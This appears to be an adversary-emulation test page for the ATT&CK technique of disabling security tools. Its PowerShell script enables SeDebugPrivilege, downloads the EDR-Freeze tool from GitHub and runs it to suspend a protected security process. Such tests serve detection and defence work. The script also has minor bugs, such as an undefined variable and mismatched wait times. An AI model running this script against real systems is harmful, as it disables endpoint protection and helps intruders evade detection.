# T1562.001 - Impair Defenses: Disable or Modify Tools
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1562/001)
<blockquote>

Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)

Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)

Adversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) 

On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)

In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.

Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)

Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)

</blockquote>


## Tehtris Test - Freeze PPL-protected process with EDR-Freeze
This test utilizes the tool EDR-Freeze, which leverages the native Microsoft binary WerFaultSecure.exe to suspend processes protected by the Protected Process Light mechanism. PPL is a Windows security feature designed to safeguard critical system processes — such as those related to antivirus, credential protection, and system integrity — from tampering or inspection. These processes operate in a restricted environment that prevents access even from administrators or debugging tools, unless the accessing tool is signed and trusted by Microsoft. By using WerFaultSecure.exe, which is inherently trusted by the operating system, EDR-Freeze is able to bypass these restrictions and temporarily freeze PPL-protected processes for analysis or testing purposes.

**Supported Platforms:** Windows


**auto_generated_guid:** cbb2573a-a6ad-4c87-aef8-6e175598559b





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| processName | PPL-protected process name to target | string | SecurityHealthService|


#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
# Enable SeDebugPrivilege
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class TokenAdjuster {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public long Luid;
        public int Attributes;
    }

    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_QUERY = 0x0008;

    public static bool EnableSeDebugPrivilege() {
        IntPtr hToken;
        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
            return false;

        long luid;
        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
            return false;

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Luid = luid;
        tp.Attributes = SE_PRIVILEGE_ENABLED;

        return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
"@

$result = [TokenAdjuster]::EnableSeDebugPrivilege()
if ($result) {
    Write-Host "SeDebugPrivilege enabled successfully." -ForegroundColor Green
} else {
    Write-Host "Failed to enable SeDebugPrivilege." -ForegroundColor Red
    exit 1
}

# Get basic process info
$process = Get-Process -Name $#{processName} -ErrorAction Stop
$processName = $process.ProcessName
Write-Host "Process Name: $processName)"
Write-Host "PID: $($process.Id)"
        
# Get executable path and user info
$query = "SELECT * FROM Win32_Process WHERE Name = '$processName.exe'"
$wmiProcess = Get-WmiObject -Query $query

$owner = $wmiProcess.GetOwner()
    Write-Host "User: $($owner.Domain)\$($owner.User)"


# Get the folder of the current script
$scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition

# Download latest EDR-Freeze package and extract (force replace)
$downloadUrl = "https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip"
$zipPath = Join-Path $scriptFolder "EDR-Freeze_1.0.zip"
Write-Host "Downloading latest EDR-Freeze from $downloadUrl" -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
    Write-Host "Download completed: $zipPath" -ForegroundColor Green
    $extractFolder = $scriptFolder
    if (Test-Path $zipPath) {
        Write-Host "Extracting archive to $extractFolder (overwriting existing files)" -ForegroundColor Cyan
        if (Test-Path $extractFolder) {
            # Ensure target exe not locked; attempt to stop any running instance silently
            Get-Process -Name "EDR-Freeze_1.0" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        }
        Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null
        # Custom extraction routine (overwrite existing) compatible with .NET Framework (no bool overwrite overload)
        $archive = $null
        try {
            $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
            foreach ($entry in $archive.Entries) {
                if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue }
                if ($entry.FullName.EndsWith('/')) { # directory entry
                    $dirPath = Join-Path $extractFolder $entry.FullName
                    if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null }
                    continue
                }
                $destPath = Join-Path $extractFolder $entry.FullName
                $destDir = Split-Path $destPath -Parent
                if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }
                if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue }
                try {
                    # Use static extension method (PowerShell 5.1 compatible)
                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false)
                } catch {
                    Write-Host "Failed to extract entry $($entry.FullName): $_" -ForegroundColor Yellow
                }
            }
            Write-Host "Extraction completed." -ForegroundColor Green
        } finally {
            if ($archive) { $archive.Dispose() }
        }
    }
} catch {
    Write-Host "Failed to download or extract EDR-Freeze: $_" -ForegroundColor Red
}

# Wait 15s before putting targeted process before putting it in the comma
Write-Host "Waiting 15s before putting $processName in the comma" -ForegroundColor Yellow
Start-Sleep -Seconds 5
Write-Host "Waiting 10s before putting $processName in the comma" -ForegroundColor Yellow
Start-Sleep -Seconds 5
Write-Host "Waiting 5s before putting $processName in the comma" -ForegroundColor Yellow
Start-Sleep -Seconds 3
Write-Host "Waiting 2s before putting $processName in the comma" -ForegroundColor Yellow
Start-Sleep -Seconds 2

# Put targeted  process in the comma for 15s
# Discover the EDR-Freeze executable dynamically (pick most recent if multiple)
$edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 1 -ExpandProperty Name
if (-not $edrFreezeExeName) {
    Write-Host "No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder" -ForegroundColor Red
    exit 1
}

$edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName
Write-Host "Using EDR-Freeze executable: $edrFreezeExeName" -ForegroundColor Cyan
Write-Host "$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)" -ForegroundColor Yellow
Start-Process -FilePath $edrFreezeExe -ArgumentList ("$($process.Id) 15000") | Out-Null
```

#### Cleanup Commands:
```powershell
Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue
Write-Output "File deleted: $edrFreezeExe"
```
